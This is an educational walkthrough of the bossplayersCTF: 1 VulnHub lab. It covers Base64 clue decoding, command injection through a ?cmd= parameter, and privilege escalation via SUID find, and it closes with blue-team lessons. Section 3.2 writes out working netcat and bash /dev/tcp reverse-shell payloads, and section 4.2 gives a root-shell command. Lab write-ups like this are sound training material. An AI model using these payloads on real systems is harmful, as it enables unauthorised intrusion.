# bossplayersCTF: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | bossplayersCTF: 1 |
| **Difficulty** | Easy / Beginner |
| **Author** | Cuong Nguyen |
| **Released** | 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/bossplayersctf-1,375/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/bossplayersctf-1,375/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian — Apache + PHP) |

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.10`. Substitute your own values.

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`, `nmap -sn`).
- **Port & service enumeration** — full TCP scan with `nmap -sC -sV -p-`.
- **Web enumeration** — reading page source for hidden clues and decoding **Base64**.
- **Recognising a rabbit hole** — a `robots.txt` decoy designed to waste your time.
- **Command injection** — a web parameter (`?cmd=`) that runs OS commands on the server.
- **Reverse shells** — turning command execution into an interactive shell and upgrading it to a TTY.
- **Linux privilege escalation** — finding a **SUID** `find` binary and abusing its `-exec` flag via [GTFOBins](https://gtfobins.github.io/gtfobins/find/).

> **Why this matters:** command injection and SUID misconfigurations are two of the most common real-world Linux footholds. The Base64 trick here (encoding command output) is also how a lot of real malware and web shells hide strings.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your interfaces and their addresses. You need to know your subnet (`192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10    08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.10    1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

> **Why it works:** the target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. The `08:00:27` MAC prefix is VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Host discovery output](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** two services are open — SSH (22) and a web server (80). SSH needs credentials we do not have, so the web server is our only viable attack surface. Apache with PHP on Debian means directory brute-forcing and source inspection are the first moves.

![nmap service scan](images/02-nmap.png)

### 2.2 Web enumeration and hidden Base64 clues

Open `http://192.168.56.101` in a browser. It is a simple "welcome" page. As always, **view the page source** — beginners skip this and miss the whole box.

```bash
curl -s http://192.168.56.101/ | tee index.html
```

You will find an HTML comment / blob containing an encoded string:

```text
WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK
```

Decode it. It is Base64 — and it is Base64 **three times over**:

```bash
echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
```

```text
workinginprogress.php
```

> **Why it works:** Base64 is an *encoding*, not encryption — anyone can reverse it. Attackers (and CTF authors) layer it to make strings non-obvious, but `base64 -d` peels each layer instantly. The final decoded value is a **file on the web server**, `workinginprogress.php`.

> **Beginner tip:** a string that ends in `==` or `=` and contains only letters, digits, `+` and `/` is almost always Base64. Decode it; never trust an encoded string.

While you are here, check the classic files:

```bash
curl http://192.168.56.101/robots.txt
```

```text
User-agent: *
Disallow:
# SUPER SECRET PASSWORD: bG9sIHRyeSBoYXJkZXIgYnJvCg==
```

```bash
echo "bG9sIHRyeSBoYXJkZXIgYnJvCg==" | base64 -d
```

```text
lol try harder bro
```

> **Why it works (and a warning):** the "super secret password" in `robots.txt` is a **rabbit hole** — decoding it just insults you. The box author warned that there are decoys. Do not chase it. The real lead is `workinginprogress.php`.

![Decoding the hidden Base64 strings](images/03-enum.png)

### 2.3 The vulnerable page

Browse to the file we found:

```bash
curl http://192.168.56.101/workinginprogress.php
```

```text
Work in progress...
[ ] Linux Debian - installed
[ ] Apache2 - installed
[ ] PHP - installed
[ ] Test the ping command - not completed
[ ] Fix privilege escalation - not completed
```

> **Why it works (as a hint):** "test the ping command" is the author telling you the page reflects input into an OS command. That is a giant neon sign pointing at **command injection**. The page takes a parameter — and because this is a PHP page, the parameter is almost certainly named `cmd`.

![The workinginprogress.php hint page](images/04-vulnerable-page.png)

---

## 3. Foothold

### 3.1 Confirm command injection

Ask the page to run `id` by appending it as a parameter:

```bash
curl "http://192.168.56.101/workinginprogress.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **What is command injection?** The PHP on the page probably does something like `system("ping " . $_GET['cmd'])`. Because it *concatenates* your input onto a shell command without validation, everything you put in `cmd` is executed by the OS. Setting `cmd=id` replaces the intended `ping` argument with `id`, so the server runs `id` for us. This is the single most common web RCE bug.

We now have command execution as **`www-data`**. Confirm with a couple more:

```bash
curl "http://192.168.56.101/workinginprogress.php?cmd=whoami"
curl "http://192.168.56.101/workinginprogress.php?cmd=uname -a"
```

### 3.2 Turn it into an interactive reverse shell

Command execution through the URL is clumsy. Get a real shell.

1. On Kali, start a listener:

```bash
nc -lvnp 4444
```

2. Then ask the target to connect back. Two common payloads:

```bash
# netcat (if the target's nc supports -e)
curl "http://192.168.56.101/workinginprogress.php?cmd=nc -e /bin/bash 192.168.56.10 4444"

# or a bash TCP reverse shell (works almost everywhere)
curl "http://192.168.56.101/workinginprogress.php?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.56.10/4444 0>%261'"
```

> **Why it works:** the injected command tells the target to open a TCP connection back to your listener and attach a shell to it. Because *you* receive the connection, it is a **reverse** shell — it bypasses inbound firewalls that would block you connecting to the target. `%26` is the URL-encoded form of `&`; the `>` and `<` characters must be encoded in a URL or the browser/curl will mangle them.

Your listener catches the shell:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51234
www-data@bossplayersCTF:/var/www/html$
```

Upgrade it to a full interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl+Z, run: stty raw -echo; fg  ; and: export TERM=xterm
```

> **Why it works:** a raw netcat shell has no tab completion, no job control, and often cannot run `su`. Spawning a pseudo-terminal fixes that.

![Command injection and the reverse shell](images/05-shell.png)

---

## 4. Privilege escalation

### 4.1 Hunt for SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/newgrp
...
```

> **What is SUID?** A binary with the SUID bit (`-rwsr-xr-x`, note the `s`) runs with the privileges of its **owner**. Here, `/usr/bin/find` is **owned by root and SUID root** — so when we run it we can make it perform actions *as root*. `find` has no legitimate reason to be SUID; this is the misconfiguration.

> **Why it is dangerous:** `find` has an `-exec` flag that runs any command you give it. Run as root, that command runs as root. This exact technique is documented on [GTFOBins](https://gtfobins.github.io/gtfobins/find/).

### 4.2 Abuse SUID `find` to get a root shell

```bash
find . -exec /bin/sh -p \; -quit
```

```text
# whoami
root
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
```

> **Why it works:**
> - `.` tells `find` to start in the current directory.
> - `-exec /bin/sh -p \;` runs `/bin/sh` for the first match.
> - `-p` tells the shell to **preserve its effective privileges** instead of dropping back to the invoking user — that is what gives us `euid=0`.
> - `-quit` stops `find` after the first match so the shell does not spawn repeatedly.
>
> Because `find` is SUID root, the `/bin/sh` it launches inherits `euid=0(root)`.

![SUID find enumeration and root shell](images/06-privesc.png)

### 4.3 The root flag

```bash
cd /root
ls -la
cat /root/root.txt
```

```text
Y29uZ3JhdHVsYXRpb25zCg==
```

Decode it:

```bash
cat /root/root.txt | base64 -d
```

```text
congratulations
```

**Root flag captured.** The flag is stored Base64-encoded in `/root/root.txt` and decodes to `congratulations`.

![Root flag](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Information disclosure via Base64 in page source | `http://<IP>/` source | Leaks hidden page `workinginprogress.php` |
| 2 | Misleading decoy file | `robots.txt` | Wastes time (rabbit hole, not exploitable) |
| 3 | **OS command injection** via unsanitised parameter | `workinginprogress.php?cmd=` | Remote code execution as `www-data` |
| 4 | Weak privilege-escalation hygiene | "fix privilege escalation — not completed" | Confirms a privesc path exists |
| 5 | **SUID root** on a shell-escapable binary | `/usr/bin/find` | Local root shell via `-exec /bin/sh -p` |
| 6 | Sensitive flag stored obfuscated, not protected | `/root/root.txt` | Readable once root is obtained |

---

## 6. Defensive lessons (blue team)

- **Never pass user input directly to a shell.** If the page must run `ping`, validate the argument as an IP address and use safe APIs (e.g. PHP `filter_var($ip, FILTER_VALIDATE_IP)`) instead of `system()`/`exec()`. Better still, avoid shelling out at all.
- **Encode is not encrypt.** Base64 in source, `robots.txt`, or a config file provides *zero* protection. If it must be secret, protect it with authentication and access control.
- **Do not rely on `robots.txt` for secrecy.** It is public by design; anything listed there is an information leak.
- **Audit SUID/SGID binaries regularly.** `find / -perm -4000 -type f` should be part of your hardening baseline; strip the SUID bit from anything that does not strictly need it. Reference [GTFOBins](https://gtfobins.github.io/) to understand which binaries are dangerous when SUID.
- **Run the web server under a locked-down account** and restrict what it can read/write. `www-data` should not be able to escalate.
- **Patch and minimise** — remove unnecessary packages (`find` variants, compilers, shells) from production hosts.
- **Detect and alert** on outbound connections from the web server, unusual child processes (`sh`, `bash`, `nc`) spawned by `apache`/`php`, and requests containing shell metacharacters (`;`, `|`, `&`, `` ` ``, `$()`).
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.

---

## 7. References

- bossplayersCTF: 1 on VulnHub — https://vulnhub.com/entry/bossplayersctf-1,375/
- Hacking Articles — "bossplayersCTF 1: Vulnhub Walkthrough" — https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/
- Infosec Institute — "bossplayersctf 1: VulnHub CTF walkthrough" — https://www.infosecinstitute.com/resources/capture-the-flag/bossplayersctf-1-vulnhub-ctf-walkthrough/
- OWASP — "OS Command Injection" — https://owasp.org/www-community/attacks/Command_Injection
- GTFOBins — `find` — https://gtfobins.github.io/gtfobins/find/
- pentestmonkey — Reverse Shell Cheat Sheet — https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- PayloadsAllTheThings — Command Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

---

## 8. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:

- [ ] `images/01-recon.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `images/02-nmap.png` — the full `nmap -sC -sV -p-` scan (SSH + HTTP).
- [ ] `images/03-enum.png` — the Base64 string in page source and its triple decode to `workinginprogress.php`.
- [ ] `images/04-vulnerable-page.png` — the `workinginprogress.php` "ping command" hint page.
- [ ] `images/05-shell.png` — `?cmd=id` command injection and the reverse shell as `www-data`.
- [ ] `images/06-privesc.png` — SUID `/usr/bin/find` enumeration and `find . -exec /bin/sh -p \; -quit` giving root.
- [ ] `images/07-root-flag.png` — `/root/root.txt` and its Base64 decode (`congratulations`).
- [ ] `images/08-recap.png` — the full chain summarised for the final report.

---

_Full exploitation chain: page source Base64 → triple-decode → `workinginprogress.php` → command injection (`?cmd=`) → reverse shell as `www-data` → SUID `/usr/bin/find` → `find . -exec /bin/sh -p \; -quit` → root → `/root/root.txt` (Base64 → `congratulations`)._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
